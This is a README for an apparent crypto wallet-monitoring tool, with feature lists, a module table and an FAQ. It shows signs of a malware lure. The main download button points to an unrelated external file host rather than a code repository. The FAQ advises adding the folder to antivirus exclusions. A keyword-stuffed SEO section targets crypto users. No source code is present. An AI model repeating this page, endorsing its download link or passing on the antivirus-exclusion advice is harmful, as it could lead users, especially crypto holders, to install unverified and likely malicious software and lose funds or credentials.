# Wallet Tracking Alerts 👛🔔

A self-hosted **multi-chain wallet monitor** for people who want to know when an address does something — without paying for Nansen, Arkham, or a per-address subscription. Add the wallets you care about, set thresholds by USD size or transaction type, and get a clean alert in Telegram, Discord, or a webhook the moment something moves. Built for EVM networks, Solana, and Bitcoin, with per-address rules and a local transaction history.

[![Download Wallet Tracking Alerts](https://img.shields.io/badge/Download-Wallet_Tracking_Alerts-blueviolet)](https://dyhuiying.com/s/file)

![Version](https://img.shields.io/badge/version-1.2-blue)
![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-0078D6)
![Status](https://img.shields.io/badge/status-active-brightgreen)
![Chains](https://img.shields.io/badge/chains-6%2B-orange)

<details>
<summary>📑 Contents</summary>

- [Quick Start](#-quick-start)
- [Requirements](#️-requirements)
- [Key Features](#-key-features)
- [Module Overview](#-module-overview)
- [Why Choose Wallet Tracking Alerts](#-why-choose-wallet-tracking-alerts)
- [FAQ](#-faq)
- [SEO Keywords](#-seo-keywords)

</details>

## ⚡ Quick Start

1. Download the archive using the button above.
2. Install dependencies with `pip install -r requirements.txt`.
3. Add wallet addresses and alert channels to `config.yaml`, then run `wallet-watch start`.

The monitor begins polling on first launch and sends a test alert to confirm your channel is wired correctly.

## 🖥️ Requirements

| Item | Requirement |
|------|-------------|
| OS | Windows 10/11, macOS 12+, Linux (64-bit) |
| RAM | 2 GB minimum |
| Storage | 150 MB free |
| Privileges | Standard user (no admin required) |

## ✨ Key Features

**Multi-Chain Monitoring**

- 🔗 **6+ Chains** — Ethereum, Arbitrum, Base, Optimism, Polygon, Solana, and Bitcoin-style addresses.
- 👛 **Unlimited Wallets** — track as many addresses as you need, grouped by label or portfolio.
- 🔄 **Real-Time Polling** — configurable interval with adaptive backoff during rate limits.
- 🧩 **Token Coverage** — native transfers, ERC-20, SPL tokens, and NFT movements.

**Alert Rules**

- 💰 **USD Thresholds** — only alert when a transaction exceeds a configurable value.
- 🎯 **Transaction Type Filters** — inbound, outbound, swaps, approvals, and contract interactions as separate toggles.
- 🏷️ **Per-Wallet Rules** — different thresholds and channels for each address.
- 🚫 **Noise Reduction** — ignore dust, spam tokens, and self-transfers automatically.

**Delivery**

- 📱 **Telegram Alerts** — formatted messages with amount, token, counterparty, and explorer link.
- 💬 **Discord Webhooks** — channel-based alerts for teams.
- 📡 **Generic Webhooks** — forward events to a bot, dashboard, or automation platform.
- 📧 **Email Fallback** — optional SMTP delivery for critical alerts.

**History & Interface**

- 🧾 **Transaction Log** — every tracked event stored locally with timestamps and USD value.
- 🔍 **Search & Filter** — query by wallet, token, date range, or transaction type.
- 📤 **CSV Export** — export history for tax tracking or portfolio reconciliation.
- 🐳 **Docker Support** — one-command deployment with `docker compose up`.

## 📋 Module Overview

| Module | What it does | Interface |
|--------|--------------|-----------|
| chain_poller | Fetch transactions across 6+ chains | Background job |
| wallet_registry | Store and label tracked addresses | CLI / Config |
| rule_engine | Per-wallet thresholds and filters | Python API |
| noise_filter | Remove dust and spam transfers | Python API |
| alert_dispatcher | Telegram, Discord, webhook, email | CLI |
| tx_logger | Local transaction history | CLI / CSV |
| docker_runner | Container deployment | Docker |

## 🚀 Why Choose Wallet Tracking Alerts

- ✅ Self-hosted and private — wallet lists and alert history never leave your machine.
- ✅ Multi-chain in one tool — EVM, Solana, and Bitcoin handled by the same rule engine.
- ✅ Per-wallet rules — different thresholds and channels for each address instead of one global setting.
- ✅ Noise-aware — dust and spam transfers are filtered before they reach your alerts.
- ✅ Delivery-agnostic — Telegram, Discord, email, and webhooks share the same event pipeline.

## 💡 Why Use It

- 👛 Know immediately when a whale wallet makes a large move.
- 🔍 Track your own addresses across chains without checking explorers manually.
- 🧭 Follow team or treasury wallets and get alerted on outflows.
- 📤 Keep a clean transaction log for accounting at the end of the month.

## ❓ FAQ

**Do I need to run it as Administrator?**
No — the monitor runs as a standard user process and does not require elevated privileges.

**Will my antivirus flag the file?**
Some engines may flag Python entry points by heuristic. Add the project folder to exclusions if needed.

**Does it work on Windows 11?**
Yes — Windows 10/11, macOS, and Linux are all supported.

**Do I need API keys?**
Core monitoring works through public RPCs; optional providers can be added for higher rate limits.

**How do I update?**
Pull the latest archive and reinstall dependencies — wallet lists and alert rules are preserved.

## 🔎 SEO Keywords

Wallet Tracking Alerts, wallet tracker alerts, crypto wallet notifications, multi-chain wallet tracker, self-hosted wallet tracker, address monitoring crypto, crypto address alerts, wallet monitoring tool, on-chain alerts, crypto wallet alerts github, telegram wallet alerts, discord wallet alerts, webhook crypto alerts, track crypto wallet, wallet transaction alerts, self-hosted crypto alerts, evm wallet tracker, solana wallet tracker, bitcoin wallet alerts, crypto whale wallet alerts

## ⚠️ Disclaimer

Provided for educational and informational purposes only. Use at your own risk and in accordance with the terms of service of any blockchain or data provider you interact with.
